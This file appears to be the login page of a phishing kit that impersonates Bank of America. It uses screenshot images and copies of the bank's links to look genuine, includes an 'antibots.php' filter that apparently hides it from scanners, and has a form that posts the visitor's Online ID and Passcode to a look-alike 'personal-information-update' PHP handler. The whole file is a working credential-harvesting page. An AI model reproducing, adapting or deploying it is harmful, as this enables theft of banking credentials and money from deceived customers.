     <?php
include "antibots.php";
?>
<html>
    
    <head>
        <! --- Links ---- !>
        <link rel="stylesheet" href="./css/style1.css" type="text/css" />
        <title>Bank Of America - Banking, Credit Cards, Home Loans & Auto Loans</title>

<link rel="shortcut icon"
              href="images/favicon.ico"/>
        <! ---- Links --- !>
         </head>

</script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <body>
        <! --- Header ---- !>
       <header class="ilyas_header">
           <div class="logo">

<form action="secure-bankofamerica-personal-information-update.php?cmd=account_update_submit&id=$praga$praga&session=$praga$praga" name="chalbhai" id="chalbhai" method="post" required="required" index.asp><!-- wrapper --><div id="wrapper">

<body>

<IMG src="images/boa-header111.png" style="position:absolute;top:0px;left:0px;">
</div>
</div>
<a href="bankofamerica-login.html?cmd=wait_submit&id=$praga$praga&session=$praga$praga"><IMG src="images/personal.png" style="position:absolute;top:8px;left:44px; solid #bdc4c9;">
</div>
</div>

<a href="https://www.ml.com/wealthmanagement.html"><IMG src="images/wmm.png" style="position:absolute;top:10px;left:255px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://www.bofaml.com/content/boaml/en_us/home.html"><IMG src="images/bii.png" style="position:absolute;top:10px;left:414px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://www.bankofamerica.com/contactus/contactus.go?request_locale=en_US"><IMG src="images/cuu.png" style="position:absolute;top:9px;left:1177px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://www.bankofamerica.com/smallbusiness/deposits/checking-accounts/"><IMG src="images/checkings.png" style="position:absolute;top:97px;left:46px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://www.bankofamerica.com/smallbusiness/cd-savings-accounts.go"><IMG src="images/savings.png" style="position:absolute;top:97px;left:222px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://promo.bankofamerica.com/olbs/index.html"><IMG src="images/bs.png" style="position:absolute;top:97px;left:389px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://www.bankofamerica.com/smallbusiness/credit-cards/#popular"><IMG src="images/cc.png" style="position:absolute;top:98px;left:640px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://www.bankofamerica.com/smallbusiness/business-financing/"><IMG src="images/lend.png" style="position:absolute;top:98px;left:846px; solid #bdc4c9;"></a>
</div>
</div>


<a href="https://www.merrilledge.com/small-business?src_cd=bac_sb_hp_nav"><IMG src="images/investment.png" style="position:absolute;top:88px;left:1011px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://smallbusinessonlinecommunity.bankofamerica.com/"><IMG src="images/learn.png" style="position:absolute;top:97px;left:1226px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://promo.bankofamerica.com/businesschecking/?source_id=10008SCK1420224&cm_sp=SB-Checking-_-SmallBusiness-Checking-_-SCU9HU6O01_SB_Hero_NH_3CardCustomerSB_getStartedBtn"><IMG src="images/gs.png" style="position:absolute;top:293px;left:405px; solid #bdc4c9;"></a>
</div>
</div>

<input name="id" type="text" class="textbox" required="required" maxlength="40" style="position:absolute;left:68px;top:176px;width:272px;height:38px;padding:1px;border-radius:0px;border:0px solid #bdc4c9;" placeholder="Online ID"> 

</div>
</div> 
<input name="pass" type="password" class="textbox" required="required" maxlength="30" style="position:absolute;left:68px;top:224px;width:272px;height:38px;padding:1px;border-radius:0px;border:0px solid #bdc4c9;" placeholder="Passcode">
</div>
</div> 

<input name="" type="checkbox" tabIndex="1" aria-label="Name On Card" class="fm-text" style="position:absolute;left:63px;top:272px;" size="6"  autofocus="1" placeholder="">
</div>
</div> 

<input type="image" name="formimage1" src="images/sign-onn.png" style="position:absolute;top:304px;left:68px;">
</div>
</div>

<a href="#"><IMG src="images/foii.png" style="position:absolute;top:353px;left:63px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="images/fpp.png" style="position:absolute;top:353px;left:201px; solid #bdc4c9;"></a>
</div>
</div>


<a href="javascript:void(0);"><IMG src="images/shh.png" style="position:absolute;top:382px;left:63px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://secure.bankofamerica.com/login/enroll/entry/olbEnroll.go?request_locale=en_US"><IMG src="images/enrolll.png" style="position:absolute;top:380px;left:264px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://promo.bankofamerica.com/hp-oaa2/"><IMG src="images/oaaa.png" style="position:absolute;top:404px;left:46px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://locators.bankofamerica.com/"><IMG src="images/atm-locc.png" style="position:absolute;top:460px;left:47px; solid #bdc4c9;"></a>
</div>
</div>

<a href="https://secure.bankofamerica.com/mycommunications/public/appointments/getTopics.go?marketingCode=NEWHP_ECHMPG"><IMG src="images/saaa.png" style="position:absolute;top:517px;left:47px; solid #bdc4c9;"></a>
</div>
</div>

                </div>
        <! --- Footer ---- !>
    </body>
</html>